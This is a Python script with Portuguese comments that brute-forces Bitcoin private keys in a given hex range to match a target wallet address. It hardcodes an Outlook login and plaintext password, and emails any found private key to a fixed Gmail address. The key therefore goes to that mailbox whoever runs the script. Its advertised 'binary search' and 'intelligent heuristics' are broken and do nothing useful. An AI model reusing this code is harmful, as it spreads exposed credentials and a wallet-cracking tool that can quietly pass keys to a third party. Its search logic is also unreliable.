import hashlib
import base58
import random
import time
import ecdsa
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def calculate_wallet_address(private_key):
    """
    Função para calcular o endereço da carteira a partir da chave privada.
    """
    private_key_bytes = bytes.fromhex(private_key)
    public_key_bytes = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1).verifying_key.to_string("compressed")
    sha256_hash = hashlib.sha256(public_key_bytes).digest()
    ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
    extended_hash = b'\x00' + ripemd160_hash
    checksum = hashlib.sha256(hashlib.sha256(extended_hash).digest()).digest()[:4]
    binary_address = extended_hash + checksum
    wallet_address = base58.b58encode(binary_address)
    return wallet_address.decode()

def check_private_key(private_key, wallet):
    """
    Função para verificar se uma chave privada corresponde à carteira.
    """
    wallet_prefix = calculate_wallet_address(private_key)[:4]
    if wallet_prefix != wallet[:4]:
        return None
    wallet_address = calculate_wallet_address(private_key)
    if wallet_address == wallet:
        return private_key, wallet_address
    return None

def generate_private_keys(start_key, stop_key):
    """
    Função para gerar chaves privadas com base em heurísticas de geração inteligente.
    """
    start_int = int(start_key, 16)
    stop_int = int(stop_key, 16)
    total_keys = stop_int - start_int + 1
    keys_remaining = total_keys
    already_tested = set()

    while keys_remaining > 0:
        random_key = random.randint(start_int, stop_int)
        private_key = hex(random_key)[2:].zfill(64)
        if private_key not in already_tested:
            already_tested.add(private_key)
            keys_remaining -= 1
            print(f"\rTestando chave privada: {private_key}", end='', flush=True)
            yield private_key

def send_email(result):
    """
    Função para enviar um e-mail quando uma chave privada válida é encontrada.
    """
    sender_email = "btcpuzze@outlook.com"  
    receiver_email = "btcpuzze@gmail.com"  # Endereço de e-mail do destinatário do Outlook
    password = "B9WuuSpG@!102"  # Sua senha de e-mail do Outlook

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Chave privada válida encontrada!"

    body = f"""\
Chave privada encontrada:
Private Key: {result[0]}
Wallet Address: {result[1]}
    """
    message.attach(MIMEText(body, "plain"))

    with smtplib.SMTP("smtp-mail.outlook.com", 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())

def search_private_key(start_key, stop_key, wallet, start_percentage):
    """
    Função para buscar chave privada usando busca binária e sequencial como último recurso.
    """
    start_int = int(start_key, 16)
    stop_int = int(stop_key, 16)
    total_keys = stop_int - start_int + 1

    start_position = int(total_keys * start_percentage)

    start_position_hex = hex(start_int + start_position)[2:].zfill(64)

    print("Starting position:", start_position_hex)

    num_keys = total_keys - start_position
    avg_verification_speed = 1000  # ajuste conforme necessário
    estimated_time_seconds = num_keys / avg_verification_speed
    estimated_hours = int(estimated_time_seconds // 3600)
    estimated_minutes = int((estimated_time_seconds % 3600) // 60)
    estimated_seconds = int(estimated_time_seconds % 60)

    print(f"Estimativa de tempo para a verificação: {estimated_hours} horas, {estimated_minutes} minutos e {estimated_seconds} segundos")

    start_time = time.time()
    results = process_keys(start_position_hex, stop_key, wallet)
    end_time = time.time()

    print_results(results)
    elapsed_time = end_time - start_time
    print(f"Tempo de execução real: {elapsed_time} segundos")

def process_keys(start_key, stop_key, wallet):
    """
    Função auxiliar para processar as chaves em um determinado intervalo, usando busca binária e sequencial como último recurso.
    """
    results = []
    start_int = int(start_key, 16)
    stop_int = int(stop_key, 16)

    tamanho_intervalo = stop_int - start_int + 1
    if tamanho_intervalo > 1000000:
        granularidade = 100000
    elif tamanho_intervalo > 10000:
        granularidade = 1000
    elif tamanho_intervalo > 1000:
        granularidade = 100
    else:
        granularidade = 10

    low = start_int
    high = stop_int
    while low <= high:
        mid = (low + high) // 2
        private_key = hex(mid)[2:].zfill(64)
        result = check_private_key(private_key, wallet)
        if result:
            results.append(result)
            send_email(result)  # Envia e-mail quando uma chave privada válida é encontrada
            break
        elif result is None:
            high = mid - granularidade
        else:
            low = mid + granularidade

    for private_key in generate_private_keys(hex(high + 1)[2:].zfill(64), stop_key):
        result = check_private_key(private_key, wallet)
        if result:
            results.append(result)
            send_email(result)  # Envia e-mail quando uma chave privada válida é encontrada
            break

    return results

def print_results(results):
    """
    Função para imprimir os resultados encontrados durante a busca.
    """
    print("=-=-=-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-")
    print("Chaves privadas encontradas:")
    if results:
        for result in results:
            if result:
                print("Private Key:", result[0])
                print("Wallet Address:", result[1])
                print()
    else:
        print("Nenhuma chave privada válida encontrada no intervalo especificado.")
    print("=-=-=-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-==-=-=-=-=-=-")

# Solicitar as informações ao usuário e validar as entradas
while True:
    try:
        start_key = input("Digite a Start key em formato hexadecimal: ")
        stop_key = input("Digite a Stop key em formato hexadecimal: ")
        wallet = input("Digite o endereço da carteira (Wallet): ")
        start_percentage = float(input("Digite a porcentagem de onde iniciar a busca (0-1): "))

        try:
            int(start_key, 16)
            int(stop_key, 16)
        except ValueError:
            raise ValueError("As chaves fornecidas não estão no formato hexadecimal correto.")

        if len(wallet) != 34 or not wallet.startswith("1"):
            raise ValueError("Endereço da carteira inválido")

        if not 0 <= start_percentage <= 1:
            raise ValueError("A porcentagem deve estar entre 0 e 1")

        break
    except ValueError as e:
        print("Erro:", e)
        print("Por favor, insira valores válidos.\n")

search_private_key(start_key, stop_key, wallet, start_percentage)
